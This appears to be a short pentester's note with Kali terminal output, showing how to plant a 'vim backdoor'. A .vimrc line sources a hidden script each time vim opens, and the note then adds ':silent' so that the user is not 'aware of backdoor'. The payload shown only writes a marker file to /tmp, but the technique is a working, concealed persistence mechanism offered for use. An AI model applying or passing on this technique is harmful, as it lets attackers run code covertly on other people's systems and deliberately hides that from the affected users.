## basic linux vim backdoor 
Create vimrc file with the following 
```
┌──(kali㉿kali)-[~]
└─$ cat .vimrc        
!source ~/.vimrunscript

```

Create ~/.vimrunscript with following 
```
#!/bin/bash
echo "hacked" > /tmp/gothacked.txt

```

We get obvious debug output message we dont want that cause it would make user aware of backdoor
```
┌──(kali㉿kali)-[~]
└─$ vim /tmp/test.txt        
:!source ~/.vimrunscript

Press ENTER or type command to continue~/
```

Change vimrc file to silent 
`:silent !source ~/.vimrunscript`

Now see the following on our tmp directory. 
```                                                       
┌──(kali㉿kali)-[~]
└─$ ls /tmp/gothacked.txt 
/tmp/gothacked.txt

```
